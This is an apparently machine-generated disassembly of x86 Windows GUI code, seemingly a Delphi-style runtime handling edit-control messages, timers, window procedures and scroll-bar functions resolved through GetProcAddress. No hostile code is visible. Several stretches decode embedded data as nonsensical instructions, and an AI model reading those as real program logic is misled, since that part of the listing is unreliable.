test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov edi eax
add edi esi
sub_42ce50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x18 ]
call sub_443f88
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x18 ]
call sub_443be8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x18 ]
call sub_43d400
mov eax [ esi + 0x18 ]
call sub_43c710
sub_42ceb4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42cf88
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_4095ec
mov edi [ ebp - 0x4 ]
mov ebx edi
test ebx ebx
je r-xdata
mov eax [ esi + 0x18 ]
call sub_43c0b8
cmp ebx eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea edx [ ebp - 0x8 ]
mov eax [ esi + 0x18 ]
call sub_43c148
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405270
setne al
mov al 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf8f
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x8 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
push edi
push 0x0
push 0xc
mov eax [ esi + 0x18 ]
call sub_443be8
push eax
call SendMessageA
test eax eax
jne r-xdata
test al al
je r-xdata
push 0x0
mov eax [ esi + 0x18 ]
xor ecx ecx
mov edx 0xb012
call sub_43d400
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
sub_42cf98
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42c250
mov edx 0xb9
mov eax ebx
call sub_43b830
mov edx 0x59
mov eax ebx
call sub_43b864
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebx + 0x276 ] 0x1
mov [ ebx + 0x277 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ ebx + 0x270 ] esi
mov [ esi + 0x18 ] ebx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_42d028
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x270 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43ef08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42d058
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_42c6b0
mov eax ebx
mov si 0xffc7
call sub_404160
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x274 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
movzx ecx [ ebx + 0x276 ]
mov ecx [ ecx * 4 + rw-data ]
not ecx
and edx ecx
or edx 0x4
or eax edx
movzx edx [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_42d0bc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_407db8
mov [ esi + 0x1b4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_407db8
mov edi eax
mov [ esi + 0x1b4 ] edi
test edi edi
je r-xdata
mov eax [ ebx ]
push eax
push 0x0
push 0xc
mov eax [ esi + 0x1b4 ]
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageA
jmp r-xdata
sub_42d185
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_443be8
push eax
call SendMessageA
shr eax 0x10
movzx eax ax
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_443be8
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_443be8
push eax
call SendMessageA
sub [ esi ] eax
pop esi
pop ebx
retn
sub_42d1e8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_443be8
push eax
call SendMessageA
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_443be8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42d290
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x278 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x277 ] 0x0
jne r-xdata
sub_42d2cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442b64
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_42d2f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d321
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d328
retn
mov eax [ rw-data ]
call sub_403f64
sub_42e02f
dec [ edx ]
add [ eax ] al
add [ ebx + 0x6c ] ah
push edi
bound eax [ gs : edx + 0x6c ]
popad
arpl [ ebx ] bp
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42e07c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e083
retn
mov eax rw-data
mov ecx 0x8a
mov edx [ r-xdata ]
call sub_405af0
sub_42e088
aam 0xe0
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
loope r-xdata
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
inc edx
add [ ecx ] cl
inc edx
add [ eax + eax ] al
add [ eax + 0x50 ] dh
inc ecx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add ah ch
loope r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ ecx + 0x10042 ] bl
out dx eax
[ ebx + 0x42 ]
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xe1189072
inc edx
loope r-xdata
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
push [ ebx ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
je r-xdata
dec ecx
outsb
je r-xdata
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42e0d472
add [ ecx + edx * 2 + 0x41 ] ch
add [ 0x78450800 ] al
je r-xdata
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
jb r-xdata
insb
jae r-xdata
call sub_404330
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42e298
mov eax [ esi + 0x34 ]
call sub_41ec8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
test bl bl
jle r-xdata
popad
insb
insb
cmp eax [ ecx ]
cmp [ eax ] al
add bh bh
inc esp
jecxz r-xdata
inc eax
add [ eax ] al
add bh bh
and al 0xe3
inc edx
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
jmp [ ebx ]
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
add al ch
or ecx [ edx ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x84565372
shl [ eax + ecx - 0x7d ] cl
sub_42e1ec
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42e298
mov eax [ esi + 0x34 ]
call sub_41ec8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42e224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42e25e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e298
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42e317
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e31e
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
sub_42e370
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e395
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e39c
retn
sub_42e3a0
in al dx
jecxz r-xdata
aas
inc eax
add [ eax - 0x1b ] bl
inc edx
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
in al 0x42
add [ eax - 0x1c ] dl
inc edx
add [ eax ] ah
add [ eax ] al
jo r-xdata
inc edx
inc ecx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
or al 0xe6
inc edx
add ah bh
inc eax
add [ eax ] bl
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
in al 0x42
add [ edi ] al
or eax 0x6d6f4354
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xe3ec676f
inc edx
add [ ecx + edx * 2 + 0x41 ] ch
add [ esi ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add eax 0x336c7443
inc esp
add [ ebx ] bh
inc ecx
add [ eax ] bh
add [ eax ] al
add [ eax - 0x1bffbd1a ] dl
in eax 0x42
add ah bl
out 0x42 al
add [ eax - 0x6fffbd1b ] ah
xor al [ eax ]
add eax 0x10000200
add [ edx - 0x11001100 ] eax
[ eax - 0x4fffbd1a ]
out 0x42 al
add al cl
out 0x42 al
add [ eax - 0x53ffbd19 ] bl
out 0x42 eax
add [ 0x6d6f4354 ] cl
insd
outsd
outsb
add [ eax ] dl
in eax 0x42
sub_42e4af
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsb
outsd
outsb
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41da5c
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_404288
push sub_42e644
call sub_41eb1c
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
insb
cmp eax [ ecx ]
push eax
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
push ebx
push 0x5653776f
test dl dl
je r-xdata
insb
cmp eax [ ecx ]
pop eax
add [ eax ] al
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0600
sub_42e558
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
call sub_41ebb4
lea eax [ esi + 0x40 ]
call sub_40f8bc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x250 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42e5a0
push esi
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459e2c
test eax eax
jne r-xdata
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
jmp r-xdata
sub_42e5e4
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_458f44
mov cl 0x1
sub_42e60c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4041b4
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42e644
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e66e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e6dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459e2c
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44e358
mov [ ebp - 0x14 ] eax
call sub_44e274
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42e785
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42e74c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e753
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_42e753
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e78c
mov eax [ ebp - 0x14 ]
call sub_44e41c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44e27c
mov eax [ ebp - 0x8 ]
add eax 0x40
call sub_40f8bc
retn
sub_42e864
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_40ad28
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42e8ff
add [ edi ] cl
add [ eax ] al
add al dh
or [ edx ] 0x38
mov al 0x4a
add [ eax ] al
add [ eax ] al
add ah ch
or [ edx ] 0xfffffff8
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add al ch
or [ edx ] 0xfffffff0
scasd [ edi ]
dec edx
add [ eax ] al
add [ eax ] al
add ah ah
or [ edx ] 0xffffffb0
mov ch 0x4a
add [ eax ] al
add [ eax ] al
add al ah
or [ edx ] 0x20
mov ah 0x4a
add [ eax ] al
add [ eax ] al
add ah bl
or [ edx ] 0x7c
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add al bl
or [ edx ] 0x8
mov ch 0x4a
add [ eax ] al
add [ eax ] al
add ah dl
or [ edx ] 0x54
mov dl 0x4a
add [ eax ] al
add [ eax ] al
add al dl
or [ edx ] 0xffffffac
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add ah cl
or [ edx ] 0xffffff8c
mov dl 0x4a
add [ eax ] al
add [ eax ] al
add al cl
or [ edx ] 0x74
mov dh 0x4a
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 - 0x4f53ffb6 ] dl
dec edx
add [ eax ] al
add [ eax ] al
add [ eax - 0x77ffb57d ] dl
mov ch 0x4a
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 - 0x4a17ffb6 ] cl
dec edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x4004a83 ] cl
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ea0b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ea12
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_405af0
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42ea14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ea45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ea4c
retn
mov eax [ rw-data ]
call sub_403f64
sub_42ea54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
0xa00042 0x0
sub_42eaa9
fiadd [ ecx ]
sub al 0xe4
inc ecx
add [ esp + esi * 4 ] bl
inc esp
add [ eax + eax * 8 ] bh
inc esp
add [ eax ] al
loop r-xdata
add bl ch
inc edx
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je sub_42eb49
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
pushfd
0xb2b40042 0x44
add [ ebx + ebp * 8 + 0x42 ] al
add ah ch
in al 0x41
add [ eax + 0x240041e4 ] dl
in al 0x41
add [ esp + 0x41 ] dl
add [ eax ] ch
in al 0x41
add [ eax - 0x4b ] dh
inc esp
add [ esi + edi * 4 + 0x44 ] ah
add ah bh
mov ebp 0xc13c0044
inc esp
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x69746341
outsd
outsb
sub_42eb44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44bac4
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_42eb49
or [ ebx + 0x36e8f0c4 ] al
push edi
std
dec [ ebx + 0x33f08bda ]
ror [ ebx - 0x309a173a ] cl
add [ eax ] eax
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_42eb80
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42ebb4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42ebdc
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42ee5e
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ee85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee8c
retn
sub_42f0d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
call sub_42abc8
mov [ esi + 0x5 ] al
mov eax r-xdata
call sub_40e3fc
cmp eax 0x60000
setae al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42f8f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_42f149
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_42f1ec
call sub_42aa08
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42f180
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
movzx eax bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
movzx eax bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42f1ec
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42f230
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_42f180
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
